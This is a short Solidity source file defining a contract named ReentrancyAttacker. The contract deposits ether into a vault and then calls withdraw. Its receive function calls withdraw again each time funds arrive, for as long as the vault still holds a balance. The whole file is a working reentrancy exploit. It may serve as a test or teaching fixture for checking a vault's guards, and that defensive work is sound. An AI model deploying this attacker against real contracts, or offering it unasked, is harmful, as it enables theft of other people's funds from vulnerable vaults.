// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyAttacker {
    IVault public immutable vault;
    uint256 public reentrantCalls;

    constructor(IVault vault_) {
        vault = vault_;
    }

    function attack() external payable {
        require(msg.value > 0, "attack funding required");
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance > 0) {
            reentrantCalls++;
            vault.withdraw();
        }
    }
}
